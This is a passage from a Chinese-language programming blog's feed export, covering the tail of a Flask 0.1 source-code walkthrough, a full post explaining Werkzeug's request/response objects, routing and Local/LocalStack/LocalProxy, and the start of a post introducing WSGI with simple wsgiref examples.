class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch_request</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, values = self.match_request()</span><br><span class="line">        <span class="keyword">return</span> self.view_functions[endpoint](**values)</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        handler = self.error_handlers.get(e.code)</span><br><span class="line">        <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        handler = self.error_handlers.get(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">if</span> self.debug <span class="keyword">or</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br></pre></td></tr></table></figure><p>在上面的方法中，Flask对URL进行匹配获取端点值和参数，然后调用相应的视图函数并将视图函数的返回值返回，或者返回相应的错误处理器的返回值。这里的返回值不一定是响应对象，比如我们可以在视图函数中返回一个字符串或者是使用<code>render_template()</code>渲染好的模板，所以，为了能够将返回值转换成合适的对象，我们需要<code>make_response()</code>方法来生成响应</p><h3 id="生成响应"><a href="#生成响应" class="headerlink" title="生成响应"></a>生成响应</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response</span><span class="params">(self, rv)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    rv允许的类型如下所示：</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    response_class          这个对象将被直接返回</span></span><br><span class="line"><span class="string">    str                     使用这个字符串作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    unicode                 将这个字符串进行utf-8编码后作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    tuple                   使用这个元组的内容作为参数创建一个请求对象</span></span><br><span class="line"><span class="string">    a WSGI function         这个函数将作为WSGI程序调用并缓存为响应对象</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    :param rv: 视图函数返回值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, self.response_class):</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, basestring):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(rv)</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, tuple):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(*rv)</span><br><span class="line">    <span class="keyword">return</span> self.response_class.force_type(rv, request.environ)</span><br></pre></td></tr></table></figure><p>在上面的方法中，也印证了我们上面所说的请求分发中<strong>视图函数的返回值不一定是请求对象</strong>这一点。所以，我们在<code>make_response</code>方法中对请求分发中获取的返回值的类型进行判断，通过不同的方式来创建真正的响应对象并返回。</p><h3 id="响应处理"><a href="#响应处理" class="headerlink" title="响应处理"></a>响应处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, response)</span>:</span></span><br><span class="line">    session = _request_ctx_stack.top.session</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        self.save_session(session, response)</span><br><span class="line">    <span class="keyword">for</span> handler <span class="keyword">in</span> self.after_request_funcs:</span><br><span class="line">        response = handler(response)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>响应处理和预处理请求类似，都会循环调用所有注册的<strong>请求后调用的函数</strong>来对响应对象<code>response</code>进行处理，不过在此之前会先将session添加到响应对象中。</p><h3 id="返回响应"><a href="#返回响应" class="headerlink" title="返回响应"></a>返回响应</h3><p>我们Flask中的响应对象会继承自Werkzeug中的<code>Response</code>对象。<code>Response</code>的实例可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。例如下面一个简易的WSGI程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>好了，到此，Flask的一次请求就处理完了。不难发现，在Flask中，对Werzeug这个工具库是很依赖的，从请求处理，路由匹配，到发起请求，都可见到Werkzeug的身影。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>请求响应类，请求上下文类，全局对象类，核心类<code>Flask</code></p><p>Flask中，保存有视图函数、错误处理函数、路由规则，可以处理请求</p><p>请求处理流程：预处理请求、请求分发、生成响应、返回响应</p><hr><p>参考：</p><ul><li>《Flask Web开发实战》</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学习一样东西，要先知其然，然后知其所以然。&lt;/p&gt;
&lt;p&gt;这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
      <category term="Flask" scheme="https://mingliangliu.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>什么是Werkzeug</title>
    <link href="https://mingliangliu.com/posts/59fca22f/"/>
    <id>https://mingliangliu.com/posts/59fca22f/</id>
    <published>2019-04-09T15:08:37.000Z</published>
    <updated>2020-02-15T06:45:50.775Z</updated>
    
    <content type="html"><![CDATA[<p>上一节介绍了<a href="/2019/04/06/什么是WSGI/#more">什么是WSGI</a>，这一节我们看看Werkzeug</p><p>按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集，后来发展成了现在非常流行的WSGI工具库。Werkzeug可以在程序中单独使用，也作为许多Python Web框架的底层库，例如现在非常流行的Flask Web框架。</p><h2 id="Werkzeug的基本功能"><a href="#Werkzeug的基本功能" class="headerlink" title="Werkzeug的基本功能"></a>Werkzeug的基本功能</h2><p>正如官方的说法，Werkzeug提供了非常丰富的功能，但是其功能总的可分为两个方面：开发测试方面的功能和其用于Web程序中的工具函数及工具类</p><h3 id="开发测试方面"><a href="#开发测试方面" class="headerlink" title="开发测试方面"></a>开发测试方面</h3><p>一、Werkzeug提供了一个简易的开发用服务器<br>二、Werkzeug提供了一些测试工具，如<code>Client</code>类、<code>EnvironBuilder</code>类。<br>三、Werkzeug提供了Debug的工具，提供了可用于Debug的中间件。当程序出错时，并不会返回500错误，而是显示程序出错的地方以及出错的原因，这就为程序的开发提供了方便。</p><h3 id="工具方面"><a href="#工具方面" class="headerlink" title="工具方面"></a>工具方面</h3><p>Werkzeug主要提供了如下几种工具</p><h4 id="一、请求和相应对象。"><a href="#一、请求和相应对象。" class="headerlink" title="一、请求和相应对象。"></a>一、请求和相应对象。</h4><p>提供了<code>Request</code>和<code>Response</code>。<code>Request</code>可以包装WSGI服务器传入的<code>environ</code>参数，并对其进行进一步的解析，以使我们更容易的使用请求中的参数。<code>Response</code>可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Request, Response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><h4 id="二、路由解析。"><a href="#二、路由解析。" class="headerlink" title="二、路由解析。"></a>二、路由解析。</h4><p>Werkzeug提供了强大的路由解析功能。比如Flask框架中经常用到的<code>Rule</code>、<code>Map</code>类等。</p><p>如下面一个程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> Map, Rule, NotFound, RequestRedirect</span><br><span class="line"></span><br><span class="line">url_map = Map([</span><br><span class="line">    Rule(<span class="string">'/'</span>, endpoint=<span class="string">'blog/index'</span>),</span><br><span class="line">    Rule(<span class="string">'/&lt;int:year&gt;/&lt;int:month&gt;/&lt;int:day&gt;/'</span>, endpoint=<span class="string">'blog/archive'</span>),</span><br><span class="line">    Rule(<span class="string">'/about'</span>, endpoint=<span class="string">'blog/about_me'</span>),</span><br><span class="line">    Rule(<span class="string">'/feeds/&lt;feed_name&gt;.rss'</span>, endpoint=<span class="string">'blog/show_feed'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    urls = url_map.bind_to_environ(environ)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, args = urls.match()</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        <span class="keyword">return</span> e(environ, start_response)</span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>)])</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'Rule points to %r with arguments %r'</span> % (endpoint, args)]</span><br></pre></td></tr></table></figure><p>我们创建了一个<code>Map</code>类实例<code>url_map</code>来保存一系列的URL规则。并且给它传递了一个<code>Rule</code>对象的列表。其中，每个<code>Rule</code>对象都包含两个参数：一个字符串和<code>endpoint</code>。字符串代表了URL匹配的规则（也叫路由规则），<code>endpoint</code>（也叫端点）代表了该路由规则对应的视图函数。即当对一个URL匹配成功后，便可获取到它对应的视图函数。不同的规则可以对应相同的<code>endpoint</code>，但是必须有不同的参数用于URL的构建，不能产生歧义，类似于函数的重载。</p><p>在<code>application</code>函数中，我们使用<code>Map</code>的<code>bind_to_environ</code>方法将<code>url_map</code>与<code>environ</code>绑定，这会返回给我们一个新的<code>MapAdapter</code>对象，这个对象可用于URL的匹配。随后，我们调用<code>MapAdapter</code>对象中的<code>match()</code>方法，获取<strong>当前请求</strong>的URL匹配到的<code>endpoint</code>和其参数信息，最后，我们用获取到的<code>endpoint</code>和参数信息发起一个响应。</p><p>用于匹配URL的路由规则字符串是由基本的URL加上占位符组成的。</p><p>例如<code>Rule(&#39;/pages/&lt;path:page&gt;&#39;)</code>，尖括号中，冒号后面为变量名，前面为变量的类型。<code>path</code>类型表示只匹配路径。这里的<code>path</code>也可以是<code>int</code>，表示匹配一个整型以及<code>float</code>等。</p><p>当不包含尖括号中的变量不写明类型时，如<code>Rule(&#39;/pages/&lt;page&gt;&#39;)</code>，这里的<code>page</code>可以匹配任何字符串，但是只能就受一个路径段，因此不能含有<code>/</code>。</p><p>更详细的规则还请参见<a href="https://werkzeug.palletsprojects.com/en/0.15.x/routing/" target="_blank" rel="noopener">文档</a></p><h4 id="三、本地上下文"><a href="#三、本地上下文" class="headerlink" title="三、本地上下文"></a>三、本地上下文</h4><p>在许多Web程序中，本地上下文是个非常重要的概念。而实现本地上下文需要用到不同线程间数据的隔离。<code>werkzeug.local</code>中定义了<code>Local</code>、<code>LocalStack</code>和<code>LocalProxy</code>等类用于实现全局数据的隔离。</p><p>在Python中，我们可以使用<code>thread locals</code>来保证多线程状态下数据的隔离，但是这在Web程序中，却并不是很好使。</p><ul><li>一是因为有些Web应用是使用协程实现的，无法保证数据的隔离。</li><li>二是即使使用的是线程，WSGI也不能保证每次请求使用的线程都是一个全新的线程，可能是一个<strong>之前请求</strong>的线程，而里面的数据也是原线程剩下的。</li></ul><p>所以，Werkzeug给我们提供了<code>Local</code>这个更好用的解决工具。</p><p>下面是一个如何使用<code>werkzeug.local</code>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalManager</span><br><span class="line"></span><br><span class="line">local = Local()</span><br><span class="line">local_manager = LocalManager([local])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    local.request = request = Request(environ)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">application = local_manager.make_middleware(application)</span><br></pre></td></tr></table></figure><p>可以看到，我们把一个<code>Request</code>对象赋值给了全局对象<code>local.request</code>，这样，我们就可以在全局范围内使用<code>local.request</code>，而且获取到的仅仅是当前请求的数据。因为<code>Local</code>对象不会在请求结束后自动清除本地上下文，所以这里我们需要使用<code>LocalManager</code>来管理。我们需要将管理的<code>Local</code>对象以列表的方式传给<code>LocalManager</code>，并在最后使用<code>LocalManager</code>的<code>make_middleware</code>方法为WSGI程序添加中间件，来使请求结束后自动清除本次请求的数据。</p><p>那么<code>Local</code>是如何实现的呢？其实很简单，在<code>Local</code>中，重写了<code>__getattr__</code>和<code>__setattr__</code>方法，使得在获取数据和存储数据之前，先获取到线程id（或协程id），以线程id（或协程id）为键，数据为值，存储在一个字典中。这样我们在操作数据的时候，操作的只会是当前线程（或协程）的数据，从而实现了数据隔离。感兴趣的同学可以查看一下文末<code>Local</code>的源码。</p><p><code>LocalStack</code>对<code>Local</code>进行了封装，使其可以以栈的方式使用。如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = LocalStack()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">42</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">23</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.pop()</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><p><code>LocalProxy</code>类用于实现werkzeug本地代理，将所有的操作转发给代理对象。如果你熟悉C++的话，你会发现这和C++的引用很像，但比引用更强大。使用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local</span><br><span class="line">l = Local()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是两个代理</span></span><br><span class="line">request = l(<span class="string">'request'</span>) <span class="comment"># Local中实现了__call__方法，用于返回一个代理，具体可以查看文末Local的源码</span></span><br><span class="line">user = l(<span class="string">'user'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> LocalStack</span><br><span class="line">_response_local = LocalStack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是个代理</span></span><br><span class="line">response = _response_local() <span class="comment"># 同理，LocalStack返回的也是代理</span></span><br></pre></td></tr></table></figure><p>除了以上创建代理的方式外，还可以手动创建一个代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalProxy</span><br><span class="line">local = Local()</span><br><span class="line">request = LocalProxy(local, <span class="string">'request'</span>)</span><br></pre></td></tr></table></figure><p>如果你想拥有一个根据指定函数来返回不同的对象代理，也是支持的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: get_current_request().session)</span><br></pre></td></tr></table></figure><p>但我们为什么要使用代理呢。这里简单说一下，我们知道，一个变量被赋值后如果不重新赋值，它的值是不会改变的，那么这在程序的某些地方就会变得很不方便。但是如果使用代理的话，那么我们在使用这个变量的时候就能动态的获取到它所代理的对象的最新的值。</p><h4 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h4><p>除了上面三个方面外，Werkzeug还提供了很多工具，例如WSGI中间件、HTTP异常类、数据结构等。这里就不在一一详述，感兴趣的同学可以参考<a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">文档</a>。</p><hr><p><code>Local</code>对象部分源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> greenlet <span class="keyword">import</span> getcurrent <span class="keyword">as</span> get_ident</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> thread <span class="keyword">import</span> get_ident</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">from</span> _thread <span class="keyword">import</span> get_ident</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span><span class="params">(object)</span>:</span></span><br><span class="line">    __slots__ = (<span class="string">'__storage__'</span>, <span class="string">'__ident_func__'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        object.__setattr__(self, <span class="string">'__storage__'</span>, &#123;&#125;)</span><br><span class="line">        object.__setattr__(self, <span class="string">'__ident_func__'</span>, get_ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> iter(self.__storage__.items())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, proxy)</span>:</span></span><br><span class="line">        <span class="string">"""Create a proxy for a name."""</span></span><br><span class="line">        <span class="keyword">return</span> LocalProxy(self, proxy)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__release_local__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__storage__.pop(self.__ident_func__(), <span class="keyword">None</span>)  <span class="comment"># 清除数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        ident = self.__ident_func__()</span><br><span class="line">        storage = self.__storage__</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            storage[ident][name] = value</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            storage[ident] = &#123;name: value&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">del</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br></pre></td></tr></table></figure><hr><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/3f38b777a621" target="_blank" rel="noopener">Werkzeug(Flask)之Local、LocalStack和LocalProxy</a></li><li><a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">Werkzeug0.15.x文档</a></li></ul><p>本篇参考Werkzeug文档写成，如有错误或与文档不符的地方，还请以文档为准，也欢迎您反馈给我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上一节介绍了&lt;a href=&quot;/2019/04/06/什么是WSGI/#more&quot;&gt;什么是WSGI&lt;/a&gt;，这一节我们看看Werkzeug&lt;/p&gt;
&lt;p&gt;按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>什么是WSGI</title>
    <link href="https://mingliangliu.com/posts/a2f3d6ca/"/>
    <id>https://mingliangliu.com/posts/a2f3d6ca/</id>
    <published>2019-04-06T11:05:50.000Z</published>
    <updated>2020-02-15T06:45:50.773Z</updated>
    
    <content type="html"><![CDATA[<p>WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。</p><img src="/images/wsgi.jpg"><p>我们知道，客户端和服务器端之间进行沟通遵循HTTP协议。但是我们用Python所编写的很多Web程序，并不会直接去处理HTTP请求，因为这太复杂了。所以WSGI诞生了，使从HTTP请求和Web程序之间，多了一种转换过程——从HTTP报文转换成WSGI的数据格式。这个时候，我们的Web程序就可以建立在WSGI之上，直接去处理WSGI解析给我们的请求，而我们就可以专注于Web程序本身的编写。</p><h2 id="一个简单的WSGI程序"><a href="#一个简单的WSGI程序" class="headerlink" title="一个简单的WSGI程序"></a>一个简单的WSGI程序</h2><p>WSGI接口定义的非常简单。根据WSGI的规定，Web程序（即WSGI程序）必须是一个可调用的对象，这个可调用对象可以是函数、方法、类或是实现了<code>__call__</code>方法的类实例。这个可调用的对象接收两个参数：</p><ul><li>environ：包含了请求的所有信息的字典。</li><li>start_response：需要在可调用对象中调用的函数，用来发起响应，参数是状态码，响应头部等。</li></ul><p>另外，这个可调用对象的还要返回一个可迭代的对象。</p><p>我们看一个简单的WSGI程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure><p>根据WSGI的定义，请求和响应的主体应为字节串，所以我们在这里返回的html格式字符串上加上了b前缀将其声明为<code>bytes</code>类型</p><h2 id="WSGI服务器"><a href="#WSGI服务器" class="headerlink" title="WSGI服务器"></a>WSGI服务器</h2><p>现在我们的Web程序（WSGI程序）编写好了，就需要一个WSGI服务器来运行它。Python提供了一个wsgiref库，我们可以在开发时进行使用。</p><p>完善上面的WSGI程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>我们使用<code>make_server(host, port, application)</code>方法创建了一个本地服务器，分别传入主机地址、端口和可调用对象。然后使用<code>server_forever()</code>方法来运行它。当在shell中运行后，在浏览器中输入localhost:5000就可以看到我们编写的效果了。</p><p>WSGI服务器在启动后会监听本地端口，当收到请求时，他会将请求报文解析成一个environ字典，然后将其传给WSGI程序，同时传递<code>start_response</code>函数。当我们的WSGI程序将请求处理完后，会通过<code>start_response</code>方法来通知WSGI服务器来发起一个响应，并设置相应的响应头，然后返回响应的主体。然后WSGI服务器再将其解析成HTTP格式，返回给客户端。你也可以通过上面的图片来理解这个过程。</p><h2 id="WSGI中间件"><a href="#WSGI中间件" class="headerlink" title="WSGI中间件"></a>WSGI中间件</h2><p>WSGI允许使用中间件（Middleware）来包装Web程序，在程序在调用前添加额外的设置和属性。这个特性常用来解耦程序的功能。</p><p>我们也可以给我们的程序添加一个中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span 